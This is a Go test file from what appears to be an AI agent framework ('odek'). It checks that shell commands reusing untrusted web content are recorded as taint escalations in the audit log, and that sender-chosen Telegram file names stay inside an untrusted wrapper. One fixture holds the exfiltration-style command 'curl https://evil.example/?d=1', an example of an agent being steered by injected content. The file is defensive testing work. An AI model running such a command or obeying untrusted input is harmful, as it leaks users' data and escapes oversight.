package main

import (
	"context"
	"strings"
	"testing"

	"github.com/BackendStack21/odek/internal/loop"
	"github.com/BackendStack21/odek/internal/session"
)

// Every surface that audits ingests also audits untrusted-args escalations:
// the recorder the loop reports them to writes the session's audit log.
func TestRED_AuditRecorders_RecordTaintEscalations(t *testing.T) {
	esc := loop.TaintEscalation{Tool: "shell", Kind: "host", Span: "evil.example", Source: "https://blog.example.net/post", Resource: "curl https://evil.example/?d=1"}

	t.Run("withAuditRecorder", func(t *testing.T) {
		store := session.NewAuditStore(t.TempDir())
		ctx := withAuditRecorder(context.Background(), store, "sess1", 3)
		fn := loop.TaintEscalationRecorderFrom(ctx)
		if fn == nil {
			t.Fatal("withAuditRecorder installs no escalation recorder")
		}
		fn(esc)
		sec16TaintAssertEscalation(t, store, "sess1", 3)
	})

	t.Run("serveAuditBinder", func(t *testing.T) {
		store := session.NewAuditStore(t.TempDir())
		b := &serveAuditBinder{store: store}
		b.escalation(esc) // before the id is bound: held, then flushed
		b.bind("sess2", 1)
		sec16TaintAssertEscalation(t, store, "sess2", 1)
	})
}

// The saved-document path is chosen by odek, not the sender: it belongs to
// the principal's message, outside the untrusted wrapper, so commands the
// agent runs on it are not escalated as reusing untrusted content. The
// sender-chosen file name stays wrapped.
func TestRED_TelegramDocumentPathOutsideWrapper(t *testing.T) {
	const p = "/home/u/.odek/media/doc_chat9_report_ab12.pdf"
	msg := telegramDocumentMessage(p)
	if !strings.Contains(msg, p) {
		t.Fatalf("message lacks the saved path: %s", msg)
	}
	for _, body := range unwrapUntrustedAll(msg) {
		if strings.Contains(body, p) {
			t.Fatalf("saved path is inside the untrusted wrapper: %s", msg)
		}
	}
	if bodies := unwrapUntrustedAll(msg); len(bodies) != 1 || !strings.Contains(bodies[0], "doc_chat9_report_ab12.pdf") {
		t.Fatalf("sender-chosen file name not wrapped: %v", bodies)
	}
}

func sec16TaintAssertEscalation(t *testing.T, store *session.AuditStore, id string, turn int) {
	t.Helper()
	log, err := store.Load(id)
	if err != nil {
		t.Fatal(err)
	}
	if len(log.Escalations) != 1 || log.Escalations[0].Turn != turn || log.Escalations[0].Span != "evil.example" {
		t.Fatalf("escalations = %+v", log.Escalations)
	}
}
